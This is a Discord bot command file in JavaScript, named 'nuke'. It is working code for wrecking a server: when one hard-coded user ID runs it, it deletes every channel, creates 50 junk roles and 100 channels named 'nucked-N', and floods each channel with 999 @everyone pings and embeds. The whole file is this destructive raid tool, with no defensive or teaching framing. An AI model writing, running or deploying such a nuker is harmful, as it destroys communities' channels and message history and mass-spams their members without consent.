module.exports.run = async (client, message, args) => {
    const { MessageEmbed } = require('discord.js');

    if (message.author.id == "854037287716651108") { } else return;
    message.delete();
    let nombresalons = 100
    let msgsend = 999
    let role1 = 50

    await message.guild.channels.cache.forEach(channel => {
        channel.delete().catch()
    })


    for (let i = 0; i < role1; i++) {
        message.guild.roles.create({
            color: 'RED',
            name: 'AmOnG uS',
            reason: 'Why not?',
        }).catch()
    }

    for (let i = 0; i < nombresalons; i++) {
        await message.guild.channels.create(`nucked-${i}`, {
            type: 'text'
        })
    }


    message.guild.channels.cache.forEach(channel => {
        for (let i = 0; i < msgsend; i++) {
            const exampleEmbed = new MessageEmbed()
                .setColor('#000000')
                .setTitle('AmOnG uS')

                .setThumbnail('https://cdn.discordapp.com/attachments/975146547190857768/975173759529005076/Capture.PNG')
            channel.send("@everyone")

            channel.send({ embeds: [exampleEmbed] }).catch()




        }
    })
}



module.exports.config = {
    name: "nuke",
    aliases: ["nuker"]
}